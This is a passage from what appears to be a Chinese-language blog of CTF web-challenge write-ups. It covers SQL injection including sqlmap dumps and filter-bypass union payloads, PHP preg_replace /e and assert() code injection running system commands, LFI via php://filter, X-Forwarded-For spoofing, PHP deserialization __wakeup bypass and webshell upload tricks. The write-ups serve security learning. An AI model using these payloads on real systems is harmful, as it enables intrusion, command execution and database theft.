-T user --columns</span><br><span class="line">sqlmap &quot;http://111.198.29.45:43546/findpwd.php&quot; --data=&quot;username=1&quot; -D cetc004 -T user -C username&amp;password --dump</span><br></pre></td></tr></table></figure><p>得到账号：c3tlwDmIn23，密码：2f8667f381ff50ced6a3edc259260ba9<br />利用重复注册账号漏洞，注册账号c3tlwDmIn23，密码123456，登录成功，取得flag</p><p><a name="zbcZl"></a></p><h2 id="ics-05"><a href="#ics-05" class="headerlink" title="ics-05"></a>ics-05</h2><p>查看源码发现?page&#x3D;index，出现page这个get参数，联想到可能存在文件包含读源码的漏洞<br />尝试读取index.php的页面源码，通过php内置协议直接读取代码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?page=php://filter/read=convert.base64-encode/resource=index.php</span><br></pre></td></tr></table></figure><p><a name="8ljxr"></a></p><h3 id="代码审计"><a href="#代码审计" class="headerlink" title="代码审计"></a>代码审计</h3><p>base64解密之后，审计源码，分析得到如下关键部分</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">//方便的实现输入输出的功能,正在开发中的功能，只能内部人员测试</span><br><span class="line">if ($_SERVER[&#x27;HTTP_X_FORWARDED_FOR&#x27;] === &#x27;127.0.0.1&#x27;) &#123;</span><br><span class="line">    echo &quot;&lt;br &gt;Welcome My Admin ! &lt;br &gt;&quot;;</span><br><span class="line">    $pattern = $_GET[pat];</span><br><span class="line">    $replacement = $_GET[rep];</span><br><span class="line">    $subject = $_GET[sub];</span><br><span class="line">    if (isset($pattern) &amp;&amp; isset($replacement) &amp;&amp; isset($subject)) &#123;</span><br><span class="line">        preg_replace($pattern, $replacement, $subject);</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        die();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p><a name="iFio8"></a></p><h3 id="preg-replace函数"><a href="#preg-replace函数" class="headerlink" title="preg_replace函数"></a>preg_replace函数</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">函数作用：搜索subject中匹配pattern的部分， 以replacement进行替换。</span><br><span class="line">$pattern: 要搜索的模式，可以是字符串或一个字符串数组。</span><br><span class="line">$replacement: 用于替换的字符串或字符串数组。</span><br><span class="line">$subject: 要搜索替换的目标字符串或字符串数组。</span><br></pre></td></tr></table></figure><p>preg_replace函数存在命令执行漏洞<br />此处明显考察的是preg_replace 函数使用 <code>/e</code>模式，导致代码执行的问题。</p><blockquote><p>&#x2F;e 修正符使 preg_replace() 将 replacement 参数当作 PHP 代码（在适当的逆向引用替换完之后）。提示：要确保 replacement 构成一个合法的 PHP 代码字符串，否则 PHP 会在报告在包含 preg_replace() 的行中出现语法解析错误。</p></blockquote><p>也就是说，pat和sub有相同部分，rep的代码就会执行。<br />根据源码分析X-Forwarded-For改成127.0.0.1之后，GET进三个参数。然后调用了preg_replace函数。并且没有对pat进行过滤，所以可以传入”&#x2F;e”触发漏洞<br><a name="X6BCi"></a></p><h3 id="构造payload"><a href="#构造payload" class="headerlink" title="构造payload"></a>构造payload</h3><p>看到这样的代码我们可以这样构造payload:<br />在HTTP头添加：<br />X-Forwarded-For:127.0.0.1<br />&#x2F;index.php?pat&#x3D;&#x2F;a&#x2F;e&amp;rep&#x3D;system(‘ls’)&amp;sub&#x3D;a<br />从而爆出文件列<br />&#x2F;index.php?pat&#x3D;&#x2F;a&#x2F;e&amp;rep&#x3D;system(‘ls+文件名’)&amp;sub&#x3D;a<br />从而爆出该文件下的文件名<br />&#x2F;index.php?pat&#x3D;&#x2F;a&#x2F;e&amp;rep&#x3D;system(‘ls+文件名&#x2F;文件名’)&amp;sub&#x3D;a<br><a name="jI6kn"></a></p><h2 id="ics-06"><a href="#ics-06" class="headerlink" title="ics-06"></a><br />ics-06</h2><p>根据提示进入报表中心，发现url中id&#x3D;1,尝试爆破，发现当id&#x3D;2333时会有flag</p><p><a name="UWZNk"></a></p><h2 id="lottery"><a href="#lottery" class="headerlink" title="lottery"></a>lottery</h2><p>大名鼎鼎的彩票题，代码审计PHP弱类型，true和1的返回结果一样，所以直接构造：<br />{“action”:”buy”,”numbers”: [true,true,true,true,true,true,true]}</p><p><a name="T1fDV"></a></p><h2 id="NewsCenter"><a href="#NewsCenter" class="headerlink" title="NewsCenter"></a>NewsCenter</h2><p>不是xss就是sql，但是想到这是一道CTF题，xss的几率不大，所以直接尝试，<br />爆库(xxxx，爆表(xxx，爆列(xx，爆值(x</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; union select 1,1,database() #</span><br><span class="line">1&#x27; union select 1,1,group_concat(table_name) from information_schema.tables where table_schema=database() #</span><br><span class="line">1&#x27; union select 1,1,group_concat(column_name) from information_schema.column where tabele_name=&#x27; xxx&#x27; #</span><br><span class="line">1&#x27; union select 1,1,xx from xxxx.xxx # </span><br><span class="line">or </span><br><span class="line">1&#x27;union select 1,1,group_concat(xx) from xxx #</span><br></pre></td></tr></table></figure><p><a name="IrRZj"></a></p><h2 id="mfw"><a href="#mfw" class="headerlink" title="mfw"></a>mfw</h2><p>代码注射题：<br />先用GitHack 将源码down下来<strong>assert()函数容易引起代码注射：</strong><br />eg:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;page&#x27;</span>])) &#123;</span><br><span class="line"> <span class="variable">$page</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;page&#x27;</span>];</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"> <span class="variable">$page</span> = <span class="string">&quot;home&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$file</span> = <span class="string">&quot;templates/&quot;</span> . <span class="variable">$page</span> . <span class="string">&quot;.php&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// I heard &#x27;..&#x27; is dangerous!</span></span><br><span class="line"><span class="title function_ invoke__">assert</span>(<span class="string">&quot;strpos(&#x27;<span class="subst">$file</span>&#x27;, &#x27;..&#x27;) === false&quot;</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&quot;Detected hacking attempt!&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// <span class="doctag">TODO:</span> Make this look nice</span></span><br><span class="line"><span class="title function_ invoke__">assert</span>(<span class="string">&quot;file_exists(&#x27;<span class="subst">$file</span>&#x27;)&quot;</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&quot;That file doesn&#x27;t exist!&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><strong>涉及函数:</strong></p><ul><li>strpos() 函数查找字符串在另一字符串中第一次出现的位置，如果没有找到字符串则返回 FALSE。</li></ul><p>语法：strpos(string,find,start)<br />参数 描述<br />string 必需。规定要搜索的字符串。<br />find 必需。规定要查找的字符串。<br />start 可选。规定在何处开始搜索。</p><ul><li>file_exists() 函数检查文件或目录是否存在</li></ul><p>如果指定的文件或目录存在则返回 true，否则返回 false。<br /><br><br />根据上述特性可以对assert第一次出现的位置进行构造：<br /><strong>通过可控变量file传入恶意参数，构造闭合 strpos(),使assert()执行恶意代码</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">位置:</span><br><span class="line"><span class="title function_ invoke__">assert</span>(<span class="string">&quot;strpos(&#x27;<span class="subst">$file</span>&#x27;, &#x27;..&#x27;) === false&quot;</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&quot;Detected hacking attempt!&quot;</span>);</span><br><span class="line">payload:</span><br><span class="line">qwe<span class="string">&#x27;,&#x27;</span>abc<span class="string">&#x27;)===false and system(&#x27;</span>cat templates/flag.php<span class="string">&#x27;) and strops(&#x27;</span>qwe</span><br><span class="line">结果：</span><br><span class="line"><span class="title function_ invoke__">assert</span>(<span class="string">&quot;strpos(&#x27;qwe&#x27;,&#x27;abc&#x27;)===false and system(&#x27;cat templates/flag.php&#x27;) and strops(&#x27;qwe&#x27;, &#x27;..&#x27;) === false&quot;</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&quot;Detected hacking attempt!&quot;</span>);</span><br></pre></td></tr></table></figure><p>我们也可以对第二处进行构造:<br /><strong>通过可控变量file传入恶意参数，构造闭合 file_exists(),使assert()执行恶意代码</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">位置:</span><br><span class="line"><span class="title function_ invoke__">assert</span>(<span class="string">&quot;file_exists(&#x27;<span class="subst">$file</span>&#x27;)&quot;</span>) <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&quot;That file doesn&#x27;t exist!&quot;</span>);</span><br><span class="line">payload:</span><br><span class="line"><span class="number">1</span><span class="string">&#x27;) or phpinfo();#</span></span><br></pre></td></tr></table></figure><blockquote><p>关于此处的#:   #是单行注释，由assert(“phpinfo()”)  &lt;&#x3D;&#x3D;&gt;  <?phpinfo()?>   可知，#的作用域仅仅是assert(函数内)<br>即为注释掉 ‘)<br>利用：<br />1’) or print_r(file_get_contents(‘templates&#x2F;flag.php’));#</p></blockquote><p><a name="SSJyY"></a></p><h2 id="Training-WWW-Robots"><a href="#Training-WWW-Robots" class="headerlink" title="Training-WWW-Robots"></a>Training-WWW-Robots</h2><p>[<a href="http://tool.chinaz.com/robots/">百度一下robots</a>]:</p><blockquote><p>Robots.txt 是存放在站点根目录下的一个纯文本文件。虽然它的设置很简单，但是作用却很强大。它可以指定搜索引擎蜘蛛只抓取指定的内容，或者是禁止搜索引擎蜘蛛抓取网站的部分或全部内容。<br><strong>使用方法:</strong><br>Robots.txt 文件应该放在网站根目录下，并且该文件是可以通过互联网进行访问的。<br>例如：如果您的网站地址是 <a href="http://www.yourdomain.com/%E9%82%A3%E4%B9%88%EF%BC%8C%E8%AF%A5%E6%96%87%E4%BB%B6%E5%BF%85%E9%A1%BB%E8%83%BD%E5%A4%9F%E9%80%9A%E8%BF%87">http://www.yourdomain.com/那么，该文件必须能够通过</a> <a href="http://www.yourdomain.com/robots.txt">http://www.yourdomain.com/robots.txt</a> 打开并看到里面的内容。<br><strong>格式：</strong><br>User-agent:<br>用于描述搜索引擎蜘蛛的名字，在” Robots.txt “文件中，如果有多条User-agent记录说明有多个搜索引擎蜘蛛会受到该协议的限制，对该文件来说，至少要有一条User-agent记录。如果该项的值设为<em>，则该协议对任何搜索引擎蜘蛛均有效，在” Robots.txt “文件中，”User-agent:</em>“这样的记录只能有一条。<br>Disallow:<br>用于描述不希望被访问到的一个URL，这个URL可以是一条完整的路径，也可以是部分的，任何以Disallow开头的URL均不会被Robot访问到。</p></blockquote><p>所以直接访问，再继续访问flag页面即可</p><p><a name="GnJCL"></a></p><h2 id="NaNNaNNaNNaN-Batman"><a href="#NaNNaNNaNNaN-Batman" class="headerlink" title="NaNNaNNaNNaN-Batman"></a>NaNNaNNaNNaN-Batman</h2><p>下载附件：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript">_=<span class="string">&#x27;function $()&#123;e=getEleById(&quot;c&quot;).value;length==16^be0f23233ace98aa$c7be9)&#123;tfls_aie&#125;na_h0lnrg&#123;e_0iit\&#x27;_ns=[t,n,r,i];for(o=0;o&lt;13;++o)&#123; [0]);.splice(0,1)&#125;&#125;&#125; \&#x27;&lt;input id=&quot;c&quot;&gt;&lt; onclick=$()&gt;Ok&lt;/&gt;\&#x27;);delete _var &quot;,&quot;docu.)match(/&quot;];/)!=null=[&quot; write(s[o%4]buttonif(e.ment&#x27;</span>;<span class="keyword">for</span>(Y <span class="keyword">in</span> $=<span class="string">&#x27; &#x27;</span>)<span class="title function_">with</span>(_.<span class="title function_">split</span>($[Y]))_=<span class="title function_">join</span>(<span class="title function_">pop</span>());<span class="built_in">eval</span>(_)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>加上HTML后缀点开发现乱码，解决办法：将eval改为alert，输出源码“</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">function $()</span><br><span class="line">&#123;var e=document.getElementById(&quot;c&quot;).value;</span><br><span class="line">if(e.length==16)</span><br><span class="line"> if(e.match(/^be0f23/)!=null)</span><br><span class="line">  if(e.match(/233ac/)!=null)</span><br><span class="line">   if(e.match(/e98aa$/)!=null)</span><br><span class="line">    if(e.match(/c7be9/)!=null)&#123;</span><br><span class="line">     var t=[&quot;fl&quot;,&quot;s_a&quot;,&quot;i&quot;,&quot;e&#125;&quot;];</span><br><span class="line">     var n=[&quot;a&quot;,&quot;_h0l&quot;,&quot;n&quot;];</span><br><span class="line">     var r=[&quot;g&#123;&quot;,&quot;e&quot;,&quot;_0&quot;];</span><br><span class="line">     var i=[&quot;it&#x27;&quot;,&quot;_&quot;,&quot;n&quot;];</span><br><span class="line">     var s=[t,n,r,i];</span><br><span class="line">     for(var o=0;o&lt;13;++o)</span><br><span class="line">      &#123;</span><br><span class="line">       document.write(s[o%4][0]);</span><br><span class="line">       s[o%4].splice(0,1)</span><br><span class="line">      &#125;</span><br><span class="line">     &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    document.write(&#x27;<span class="tag">&lt;<span class="name">input</span> <span class="attr">id</span>=<span class="string">&quot;c&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">button</span> <span class="attr">onclick</span>=<span class="string">$()</span>&gt;</span>Ok<span class="tag">&lt;/<span class="name">button</span>&gt;</span>&#x27;);</span><br><span class="line">    delete _</span><br></pre></td></tr></table></figure><p>解法1：构造payload输进文本框,payload需要满足1.16位 2.be0f23开头 e98aa结尾的 be0f233acc7be98aa<br />解法2：将含有输出flag的代码放到控制台即可</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">var t=[&quot;fl&quot;,&quot;s_a&quot;,&quot;i&quot;,&quot;e&#125;&quot;];</span><br><span class="line">    var n=[&quot;a&quot;,&quot;_h0l&quot;,&quot;n&quot;];</span><br><span class="line">    var r=[&quot;g&#123;&quot;,&quot;e&quot;,&quot;_0&quot;];</span><br><span class="line">    var i=[&quot;it&#x27;&quot;,&quot;_&quot;,&quot;n&quot;];</span><br><span class="line">    var s=[t,n,r,i];</span><br><span class="line">    for(var o=0;o&lt;13;++o)</span><br><span class="line">     &#123;</span><br><span class="line">      document.write(s[o%4][0]);</span><br><span class="line">      s[o%4].splice(0,1)</span><br><span class="line">     &#125;</span><br></pre></td></tr></table></figure><p><a name="aKu4b"></a></p><h2 id="unserialize3"><a href="#unserialize3" class="headerlink" title="unserialize3"></a>unserialize3</h2><p>根据标题，我们能看出来这是一道PHP反序列化题，仔细斟酌，我们需要将它进行序列化，当序列化字符串表示对象属性个数的值大于真实个数的属性时就会跳过<code>__wakeup</code>的执行。</p><blockquote><p><br />serialize() 函数会检查类中是否存在一个魔术方法 __sleep()。如果存在，__sleep()方法会先被调用，然后才执行序列化操作。<br>可以在__sleep()方法里可以决定哪些属性被序列化<br>如果没有__sleep()方法则默认序列化所有属性</p></blockquote><p>eg:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">序列化函数serialize()</span><br><span class="line">序列化举例说明：</span><br><span class="line">O:3:&quot;Ctf&quot;:3&#123;s:4:&quot;flag&quot;;s:13:&quot;flag&#123;abedyui&#125;&quot;;s:4:&quot;name&quot;;s:7:&quot;Sch0lar&quot;;s:3:&quot;age&quot;;s:2:&quot;18&quot;;&#125;</span><br><span class="line">O代表对象 因为我们序列化的是一个对象 序列化数组则用A来表示</span><br><span class="line">3 代表类名字占三个字符 </span><br><span class="line">ctf 类名</span><br><span class="line">3 代表三个属性</span><br><span class="line">s代表字符串</span><br><span class="line">4代表属性名长度</span><br><span class="line">flag属性名</span><br><span class="line">s:13:&quot;flag&#123;abedyui&#125;&quot; 字符串 属性值长度 属性值</span><br></pre></td></tr></table></figure><p>本题序列化出来：O:4:”xctf”:1:{s:4:”flag”;s:3:”111”;}<br />则如果要绕过__wakeup，则只需改变对象属性的个数即可绕过，则把O:4:”xctf”:1:{s:4:”flag”;s:3:”111”;} 中的1改为大于它的数即可</p><p><a name="rUdpT"></a></p><h2 id="Bug"><a href="#Bug" class="headerlink" title="Bug"></a>Bug</h2><p><a name="a1V1V"></a></p><h3 id="大坑1：二次注入"><a href="#大坑1：二次注入" class="headerlink" title="大坑1：二次注入"></a>大坑1：二次注入</h3><p>进去之后尝试二次注入。即注册用户admin ‘# 完事儿后进去修改密码，修改完的就是admin的密码，结果发现用admin登录之后没用<br><a name="gTR8B"></a></p><h3 id="大坑2：爆破"><a href="#大坑2：爆破" class="headerlink" title="大坑2：爆破"></a>大坑2：爆破</h3><p>尝试爆破的小伙伴就不用费心了<br><a name="wkO77"></a></p><h3 id="大坑3：忘记密码"><a href="#大坑3：忘记密码" class="headerlink" title="大坑3：忘记密码"></a>大坑3：忘记密码</h3><p>在各种办法都试过之后，我终于看到忘记密码这个选项了，别的办法的都试过了，没用，那就只能从这下手了，尝试修改密码，用admin的账户修改，发现报错，没用，差点死心了，不得已而为之，我只好尝试修改自己注册的二次注入用户admin ‘#，用它修改密码然后抓包，修改它，即用户名为admin，发现修改成功！<br><a name="tsClf"></a></p><h3 id="大坑4：IP伪造"><a href="#大坑4：IP伪造" class="headerlink" title="大坑4：IP伪造"></a>大坑4：IP伪造</h3><p>进去之后，不多BB直接点manage，发现IP不被允许，只好再次抓包，在Referer头下面添加X-forwarded-for:127.0.0.1，伪造成功！<br><a name="PQ4X8"></a></p><h3 id="大坑5：do-？"><a href="#大坑5：do-？" class="headerlink" title="大坑5：do??？"></a>大坑5：do??？</h3><p>进去之后啥也没，只好查看页面元素发现提示：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">index.php?module=filemanage&amp;<span class="keyword">do</span>=???</span><br></pre></td></tr></table></figure><p>do???这时候就得猜了，无非就是文件上传,upload,尝试之后，终于进去了：<img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.top/1576407995541-4530fc54-635b-4e00-8797-383a0eb31c73.png" alt="2.png"><br><a name="l3Ijo"></a></p><h3 id="大坑6：一句话写法"><a href="#大坑6：一句话写法" class="headerlink" title="大坑6：一句话写法"></a>大坑6：一句话写法</h3><p>发现写入一句话<?php eval(中间我就省略不写了)?>，显示上传失败：it’s a php,尝试写入</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script language=<span class="string">&quot;php&quot;</span>&gt;<span class="keyword">eval</span>(.....懒得打)&lt;/script&gt;</span><br></pre></td></tr></table></figure><p><a name="OrGSf"></a></p><h3 id="大坑7：后缀名"><a href="#大坑7：后缀名" class="headerlink" title="大坑7：后缀名"></a>大坑7：后缀名</h3><p>发现不让上传PHP文件，更改后缀为js或html，虽然成功了但是没爆出flag，也归为失败<br />几番尝试之后，发现后缀改为php5即可</p><p><a name="aAx8r"></a></p><h2 id="Upload"><a href="#Upload" class="headerlink" title="Upload"></a>Upload</h2><p>这道题虽说是一道文件上传题，确实是，但是套路用的却是sql注入的，我怎么想也想不到，fuzz几遍后迫于无奈看了一下wp,才发现这是sql注入并且注入点在filename,ohmygod,我太难了。。。</p><p><a name="Vg0Qp"></a></p><h3 id="注入思路"><a href="#注入思路" class="headerlink" title="注入思路"></a>注入思路</h3><p>用了一下以往的注入思路，union select 1,1,1#<br />发现不仅没点卵用，而且还过滤了union和select<br><a name="yx4fl"></a></p><h3 id="爆库"><a href="#爆库" class="headerlink" title="爆库"></a>爆库</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;+(selselectect CONV(substr(hex(dAtaBase()),1,12),16,10))+&#x27;</span>.jpg</span><br><span class="line">(<span class="number">16</span><span class="operator">=</span><span class="operator">&gt;</span><span class="number">10</span><span class="operator">=</span><span class="operator">&gt;</span>hex<span class="operator">=</span><span class="operator">&gt;</span>web_up)</span><br></pre></td></tr></table></figure><p>尝试以后发现用这个数据库暴不出来表<br />然后修改一下substr的起始位置参数，看看后边还有没有<br />修改为：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;+(selselectect CONV(substr(hex(database()),13,20),16,10))+&#x27;</span>.jpg</span><br><span class="line">(<span class="number">16</span><span class="operator">=</span><span class="operator">&gt;</span><span class="number">10</span><span class="operator">=</span><span class="operator">&gt;</span>hex<span class="operator">=</span><span class="operator">&gt;</span>load)</span><br></pre></td></tr></table></figure><p>数据库名合起来为:web_upload</p><p><a name="pcMN4"></a></p><h3 id="爆表名"><a href="#爆表名" class="headerlink" title="爆表名"></a>爆表名</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;+(seleselectct CONV(substr(hex((selselectect TABLE_NAME frfromom information_schema.TABLES where TABLE_SCHEMA = &#x27;</span>web_upload<span class="string">&#x27; limit 1,1)),1,12),16,10))+&#x27;</span>.jpg</span><br><span class="line">hello_</span><br><span class="line"><span class="string">&#x27;+(seleselectct CONV(substr(hex((selselectect TABLE_NAME frfromom information_schema.TABLES where TABLE_SCHEMA = &#x27;</span>web_upload<span class="string">&#x27; limit 1,1)),13,12),16,10))+&#x27;</span>.jpg</span><br><span class="line">flag_i</span><br><span class="line"><span class="string">&#x27;+(seleselectct CONV(substr(hex((selselectect TABLE_NAME frfromom information_schema.TABLES where TABLE_SCHEMA = &#x27;</span>web_upload<span class="string">&#x27; limit 1,1)),25,12),16,10))+&#x27;</span>.jpg</span><br><span class="line">s_here</span><br></pre></td></tr></table></figure><p>表名连起来就是：hello_flag_is_here<br><a name="e0rnw"></a></p><h3 id="爆列名"><a href="#爆列名" class="headerlink" title="爆列名"></a>爆列名</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;+(seleselectct CONV(substr(hex((selselectect COLUMN_NAME frfromom information_schema.COLUMNS where TABLE_NAME = &#x27;</span>hello_flag_is_here<span class="string">&#x27; limit 0,1)),1,12),16,10))+&#x27;</span>.jpg</span><br><span class="line">i_am_f</span><br><span class="line"><span class="string">&#x27;+(seleselectct CONV(substr(hex((selselectect COLUMN_NAME frfromom information_schema.COLUMNS where TABLE_NAME = &#x27;</span>hello_flag_is_here<span class="string">&#x27; limit 0,1)),13,12),16,10))+&#x27;</span>.jpg</span><br><span class="line">lag</span><br></pre></td></tr></table></figure><p>列名就出来了：i_am_flag，其实后面不用爆就能猜到是lag<br><a name="xONsw"></a></p><h3 id="爆值"><a href="#爆值" class="headerlink" title="爆值"></a>爆值</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;+(selselectect CONV(substr(hex((seleselectct i_am_flag frfromom hello_flag_is_here limit 0,1)),1,12),16,10))+&#x27;</span>.jpg</span><br><span class="line"><span class="operator">!</span><span class="operator">!</span>_<span class="variable">@m_</span></span><br><span class="line"><span class="string">&#x27;+(selselectect CONV(substr(hex((seleselectct i_am_flag frfromom hello_flag_is_here limit 0,1)),13,12),16,10))+&#x27;</span>.jpg</span><br><span class="line">Th.e_F</span><br><span class="line"><span class="string">&#x27;+(selselectect CONV(substr(hex((seleselectct i_am_flag frfromom hello_flag_is_here limit 0,1)),25,12),16,10))+&#x27;</span>.jpg</span><br><span class="line"><span class="operator">!</span>lag</span><br></pre></td></tr></table></figure><p>flag的值我们就有了:!!&lt;<a href="mailto:&#x5f;&#x40;&#x6d;&#x5f;&#84;&#x68;&#x2e;&#101;&#95;&#70;">&#x5f;&#x40;&#x6d;&#x5f;&#84;&#x68;&#x2e;&#101;&#95;&#70;</a>&gt;!lag</p><p><a name="TqsUH"></a></p><h3 id="相关知识点"><a href="#相关知识点" class="headerlink" title="相关知识点"></a>相关知识点</h3><p>首先很多人一定有疑问，这个注入语句两端的+加号和单引号是干嘛的?<br />加上＋的意思是把页面传进来的值放在SQL语句里拼接起来<br /><strong>记住这样的传值格式<br /></strong>“numbers”: [true,true,true,true,true,true,true]} &#x2F;&#x2F;定义数组<br />“numbers”:”1,2,3,4,5,6,7”}<br />‘+(xxxxxx)+’</p><p><strong>函数</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1.</span>CONV()</span><br><span class="line">        简单的来说这个函数就是用来进行进制的转换的</span><br><span class="line">        </span><br><span class="line">        CONV(N,from_base,to_base)</span><br><span class="line">        </span><br><span class="line">        N是要转换的数据，from_base是原进制，to_base是目标进制。</span><br><span class="line">        </span><br><span class="line">        如果N是有符号数字，则to_base要以负数的形式提供，否则会将N当作无符号数</span><br><span class="line">        </span><br><span class="line"> <span class="number">2.</span>substr（）</span><br><span class="line">    简单来说 这个函数是用来搜索字符串的</span><br><span class="line">        </span><br><span class="line">    substr(string string,num <span class="keyword">start</span>,num length);</span><br><span class="line"></span><br><span class="line">    string为字符串；</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">start</span>为起始位置；</span><br><span class="line">    </span><br><span class="line">    length为长度。</span><br><span class="line">    </span><br><span class="line">    mysql中的<span class="keyword">start</span>是从<span class="number">1</span>开始的，而hibernate中的<span class="keyword">start</span>是从<span class="number">0</span>开始的。</span><br><span class="line">        </span><br><span class="line">        注意，这里substr取<span class="number">12</span>位是因为一旦过长（超出<span class="number">12</span>），就会用科学记数法显示</span><br><span class="line"></span><br><span class="line"> <span class="number">3.</span>hex（）</span><br><span class="line">    这个就很好理解了，转为<span class="number">16</span>进制嘛</span><br><span class="line">        </span><br><span class="line">  <span class="number">4.</span>limit</span><br><span class="line">     LIMIT 子句可以被用于强制 <span class="keyword">SELECT</span> 